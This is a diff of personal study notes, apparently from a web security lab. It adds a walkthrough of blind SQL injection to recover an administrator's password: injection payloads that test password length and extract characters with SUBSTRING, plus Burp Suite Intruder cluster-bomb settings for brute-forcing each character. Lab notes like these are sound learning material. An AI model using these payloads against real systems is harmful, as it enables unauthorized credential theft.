@@ -77,4 +77,18 @@ Day-4
    - now the next step is to get the password
    - for that, we will modigy our query by checking the password length one by one until we get some error.
    - +AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>1)%3d'a
-   - 
+   - here, we'll send the data to the intruder in the burpsuit and then will enumerate the password length.
+      + intruder > positions > clear (all positions) > select the position to be iterated > payloads > set payload type to "Numbers" > from: 1 > to: 50 > steps: 1 > start attack
+      + here we got the different length of the message on the suit, it means we might have lenght of the password as 20.
+      + now, we got the lenght of password, now we have to get the characters of the password.
+      + we will be again doing the enumeration on each and every character.
+      + '+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username%3d'administrator')%3d'a
+      + intruder > positions > clear (all positions) > select the position to be iterated > payloads > set payload type to "brute forcer" > set minlength and maxlength: 1 > start attack
+      + now, instead of doing it for each and every character, use "CLUSTER BOMB".
+      + Intruder > attack type: cluster bomb > add both the positions (position and character) > add them > payloads > 
+         >> for payload set: 1
+               payload type: "Numbers" > from: 1 > to: 20 > step: 1
+         >> for payload set: 2
+               payload type: "brute forcer" > min length: 1 > max length: 1
+         >> start attack
+      + after that we will get the password.
